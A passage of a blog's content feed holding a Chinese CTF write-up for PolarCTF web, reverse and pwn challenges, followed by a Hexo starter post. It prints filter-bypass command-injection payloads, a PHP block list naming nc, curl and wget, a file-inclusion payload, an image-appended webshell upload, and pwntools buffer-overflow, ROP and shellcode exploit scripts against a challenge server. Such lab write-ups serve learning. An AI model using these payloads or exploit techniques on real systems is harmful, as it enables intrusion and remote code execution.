invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;twothree&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;1&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;2&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造payload<code>php://filter/read=convert.base64-encode/resource=flag</code>得到flag</p><h3 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h3><p>根据提示访问一下sys.php，分析源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;, $cmd)) &#123;</span><br><span class="line">        $output = system($cmd);</span><br><span class="line">        echo $output;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造payload</p><p>方法一：尝试php -r来进行二次执行，ff是进行的一个绕过执行，否则得不到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br><span class="line">查看</span><br><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure><p>方法二：这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=`printf &quot;Y2F0IC8q&quot;|bas&quot;&quot;e64 -d`</span><br></pre></td></tr></table></figure><p>方法三：上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了,空格用$&lt;进行绕过<a href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp及个人复盘/">文章</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27</span><br></pre></td></tr></table></figure><h3 id="笑傲上传"><a href="#笑傲上传" class="headerlink" title="笑傲上传"></a>笑傲上传</h3><p>首先看到下边这个页面，发现神秘链接可以跳转，出现了代码，感觉应该是先上传文件，然后在源码这里进行file传参，用蚁剑连接</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.15.01.png" alt="截屏2025-03-01 09.15.01" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.14.20.png" alt="截屏2025-03-01 09.14.20" style="zoom:50%;" /></p><p>试一下上传，发现只能上传图片的，那么直接将木马拼接在图片后边</p><p><code>cat hack.php &gt;&gt; tou.jpg</code>，然后上传文件，发现上传成功了，然后用蚁剑连接</p><p><code>http://00112188-145b-45ab-a6f6-124c0de1a115.www.polarctf.com:8090/include.php?file=/var/www/html/upload/6120250301011149.jpg</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.18.44.png" alt="截屏2025-03-01 09.18.44" style="zoom:50%;" /></p><h2 id="REVERSE-逆向"><a href="#REVERSE-逆向" class="headerlink" title="REVERSE 逆向"></a>REVERSE 逆向</h2><h3 id="康师傅"><a href="#康师傅" class="headerlink" title="康师傅"></a>康师傅</h3><p>首先去EPinfo查看是否加壳，没有加壳用IDA进行查看主函数，找到了main函数，进行分析这段代码是将Str1与9进行异或来加密的，然后编写python进行解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-84h]</span><br><span class="line">  char Str2[60]; // [esp+DCh] [ebp-78h] BYREF</span><br><span class="line">  char Str1[39]; // [esp+118h] [ebp-3Ch] BYREF</span><br><span class="line">  int v7; // [esp+13Fh] [ebp-15h]</span><br><span class="line">  int v8; // [esp+143h] [ebp-11h]</span><br><span class="line">  __int16 v9; // [esp+147h] [ebp-Dh]</span><br><span class="line">  char v10; // [esp+149h] [ebp-Bh]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_53B006);</span><br><span class="line">  strcpy(Str1, &quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  j__memset(Str2, 0, 0x32u);</span><br><span class="line">  sub_45748D(&quot;请输入密码\r\n&quot;);</span><br><span class="line">  sub_457929(&amp;unk_510E50, (char)Str2);</span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str2); ++i )</span><br><span class="line">    Str2[i] ^= 9u;</span><br><span class="line">  if ( !j__strcmp(Str1, Str2) )</span><br><span class="line">    sub_45748D(&quot;right&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_45748D(&quot;error&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py脚本</span></span><br><span class="line">encrypted_str = <span class="string">&quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encrypted_str:</span><br><span class="line">    <span class="comment"># 解密：异或 9u</span></span><br><span class="line">    decrypted_char = <span class="built_in">ord</span>(char) ^ <span class="number">9</span></span><br><span class="line">    flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为可读字符串</span></span><br><span class="line">flag_str = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Password:&quot;</span>, flag_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到flag--Decrypted Password: flag&#123;17625630b7902ac99f735f61ea21a0e2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="加加减减"><a href="#加加减减" class="headerlink" title="加加减减"></a>加加减减</h3><p>首先更改文件后缀解压压缩包得到exe，然后放到ida分析，得到加密的代码进行分析，把用户输入的字符的ASCII-1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [esp+0h] [ebp-154h]</span><br><span class="line">  char v5; // [esp+0h] [ebp-154h]</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-84h]</span><br><span class="line">  char Str[60]; // [esp+DCh] [ebp-78h] BYREF</span><br><span class="line">  char Str2[39]; // [esp+118h] [ebp-3Ch] BYREF</span><br><span class="line">  int v9; // [esp+13Fh] [ebp-15h]</span><br><span class="line">  int v10; // [esp+143h] [ebp-11h]</span><br><span class="line">  __int16 v11; // [esp+147h] [ebp-Dh]</span><br><span class="line">  char v12; // [esp+149h] [ebp-Bh]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C009);</span><br><span class="line">  strcpy(Str2, &quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;);</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  j_memset(Str, 0, 0x32u);</span><br><span class="line">  sub_41104B(&quot;input\r\n&quot;, v4);</span><br><span class="line">  sub_4110AA(&quot;%s&quot;, (char)Str);</span><br><span class="line">  for ( i = 0; i &lt; j_strlen(Str); ++i )</span><br><span class="line">    --Str[i];</span><br><span class="line">  if ( !j_strcmp(Str, Str2) )</span><br><span class="line">    sub_41104B(&quot;success\r\n&quot;, v5);</span><br><span class="line">  else</span><br><span class="line">    sub_41104B(&quot;sorry\r\n&quot;, v5);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py脚本</span></span><br><span class="line">encrypted_str = <span class="string">&quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encrypted_str:</span><br><span class="line">    <span class="comment"># 每个字符的 ASCII 码值 +1</span></span><br><span class="line">    decrypted_char = <span class="built_in">ord</span>(char) + <span class="number">1</span></span><br><span class="line">    flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为可读字符串</span></span><br><span class="line">flag_str = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Password:&quot;</span>, flag_str)</span><br><span class="line"><span class="comment">#得到flag--Decrypted Password: flag&#123;62341970df8bd80a5b92a7098cac39b6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>pwn题目的基本步骤先用file 和checksec看一下文件，然后放到ida中分析，然后调试，写py脚本</p><h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>首先分析一下源码，在main()函数中发现了box()函数，进去看一下，发现了有if语句对输入的buf进行了判断，然后发现字符串中没有/bin/sh,那应该是用<code>$0</code>了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 18.59.56.png" alt="截屏2025-03-05 18.59.56" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 19.01.15.png" alt="截屏2025-03-05 19.01.15" style="zoom:50%;" /></p><p>那么编写py脚本,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./sandbox&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2147</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;$0&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h3><p>分析到该文件是64位的，在main函数中有一个game函数，发现read函数读取buf，然后if去比较buf的长度是否等于15，如果等于15就会输出flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 20.14.03.png" alt="截屏2025-03-05 20.14.03" style="zoom:50%;" /></p><p>直接编写py脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./creeper&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2088</span>)</span><br><span class="line">padding = <span class="number">0x40</span> +<span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">14</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="简单溢出"><a href="#简单溢出" class="headerlink" title="简单溢出"></a>简单溢出</h3><p>分析main函数发现只有一个输入，根据题目，肯定是溢出发现有<code>/bin/sh</code>字符串，然后通过查看该字符串发现了后门函数fact</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 20.53.51.png" alt="截屏2025-03-05 20.53.51" style="zoom:50%;" /></p><p>直接构造payload,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./hahaha&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2122</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span> </span><br><span class="line">fact_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(fact_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Emm"><a href="#Emm" class="headerlink" title="Emm"></a>Emm</h3><p>该文件为32位，并且通过ida发现存在flag函数内容是<code>cat flag</code>,那么直接构造</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 21.46.53.png" alt="截屏2025-03-05 21.46.53" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./emm&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2078</span>)</span><br><span class="line">padding = <span class="number">0x58</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x080484CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding +  p32(flag_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()     </span><br></pre></td></tr></table></figure><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>通过分析，发现了经典后门函数Shell，可以直接构造调用了,然后找一下如何进行栈溢出来调用这个shell函数</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 21.50.52.png" alt="截屏2025-03-05 21.50.52"></p><p>通过发现Data1()和Data2()两个函数满足栈溢出条件，但是不满足攻击条件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.22.40.png" alt="截屏2025-03-05 22.22.40" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.22.59.png" alt="截屏2025-03-05 22.22.40" style="zoom:50%;" /></p><p>发现Data3()满足栈溢出的攻击攻击条件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.24.38.png" alt="截屏2025-03-05 22.24.38" style="zoom:50%;" /></p><p>通过代码，发现要先运行main函数输入3才能进入Data3函数，所以写脚本的时候要先发送一个3</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.25.54.png" alt="截屏2025-03-05 22.25.54" style="zoom:50%;" /></p><p>构造payload，得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./Choice&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2077</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x4007BD</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Menu:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>) <span class="comment">#先发送3来进入Data3函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(shell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="overload1"><a href="#overload1" class="headerlink" title="overload1"></a>overload1</h3><p>在main函数中看到了后门函数，那么看看如何能运行到这个函数，分析一下，首先输入v5的值，然后与y进行比较，等于y进入后输入v4的值，最后会用v5的1去与a比较，那么根据题目overload，应该是v4把v5给覆盖了，通过地址看出来的</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.15.15.png" alt="截屏2025-03-05 23.15.15" style="zoom:50%;" /></p><p>构造payload,来获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./overload1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2091</span>)</span><br><span class="line">padding = <span class="number">0x110</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;y/n\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>通过源码分析，有/bin/sh还有shell函数，那么拼接一下就可以了，主函数中有function函数有一个读取，根据文件为64位，那么payload应该是rdi占满后加上system(“/bin/sh”)</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.33.47.png" alt="截屏2025-03-05 23.33.47" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.34.05.png" alt="截屏2025-03-05 23.34.05" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.34.25.png" alt="截屏2025-03-05 23.34.25" style="zoom:50%;" /></p><p>构造一下payload,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./x64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2083</span>)</span><br><span class="line">padding = <span class="number">0x80</span> + <span class="number">8</span></span><br><span class="line">binsh_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x4006B6</span></span><br><span class="line">rdi_addr = <span class="number">0x4007e3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(rdi_addr) + p64(binsh_addr) + p64(shell_addr)</span><br><span class="line"><span class="comment">#64位的参数从左到右放入寄存器：RDI, RSI, RDX, ECX, R8, R9，之后跟32位一样，找出溢出偏移量、进入function函数中、覆盖返回地址为shell 将/bin/sh作为参数传入</span></span><br><span class="line"><span class="comment"># 还差一个rdi地址</span></span><br><span class="line"><span class="comment"># 使用命令：</span></span><br><span class="line"><span class="comment"># ROPgadget --binary x64 --only &quot;pop|ret&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.38.44.png" alt="截屏2025-03-05 23.38.44" style="zoom:50%;" /></p><h3 id="你是大佬还是菜鸡"><a href="#你是大佬还是菜鸡" class="headerlink" title="你是大佬还是菜鸡"></a>你是大佬还是菜鸡</h3><p>通过分析源码，得到当输入2的时候会进入Caiji函数，进而读取buf，来进行溢出漏洞，通过搜索发现hint函数是经典的后门函数</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.22.11.png" alt="截屏2025-03-06 10.22.11" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.22.39.png" alt="截屏2025-03-06 10.22.39" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.23.09.png" alt="截屏2025-03-06 10.23.09" style="zoom:50%;" /></p><p>需要通过payload调用hint函数的地址，让caiji函数读取进而得到shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2070</span>)</span><br><span class="line">padding = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">hint_addr = <span class="number">0x4008b0</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Ji\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>) <span class="comment">#先发送2来进入caiji函数，来进行溢出漏洞</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(hint_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Easy-ShellCode"><a href="#Easy-ShellCode" class="headerlink" title="Easy_ShellCode"></a>Easy_ShellCode</h3><p>通过分析源码，发现main函数中有一个Start函数，但是通过字符串搜索没有发现<code>/bin/sh</code>那么就需要自己写shellcode了，后来发现这个start函数有两次输入，第一次读取的是str变量，发现他在bss段，那么就可以把shellcode放到这里，然后第二次读取buf的时候进行溢出，去调取bss的地址也就是bss_addr</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 14.27.56.png" alt="截屏2025-03-06 14.27.56" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 14.28.13.png" alt="截屏2025-03-06 14.28.13" style="zoom:50%;" /></p><p>有思路了，那就构造payload，获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./Easy_ShellCode&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2102</span>)</span><br><span class="line">padding = <span class="number">0x68</span> + <span class="number">4</span></span><br><span class="line">bss_addr = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;?:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(bss_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="play"><a href="#play" class="headerlink" title="play"></a>play</h3><p>分析源码，发现main函数中有一个play函数，然后有两次输入，一次是读取，第二次是gets，那么可以第一次read可以去读shellcode第二次gets去找bss_addr</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 15.08.55.png" alt="截屏2025-03-06 15.08.55" style="zoom:50%;" /></p><p>构造payload,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./play&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>, <span class="number">2062</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line">bss_addr = <span class="number">0x6010A0</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;playing.\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding  + p64(bss_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;game?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"guipi`Blog","short_name":"guipi","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/siteicon/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/siteicon/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/siteicon/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/siteicon/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/siteicon/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/siteicon/144.png","sizes":"144x144","type":"image/png"},{"src":"/img/siteicon/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>即刻短文</title>
      <link href="/essay/index.html"/>
      <url>/essay/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
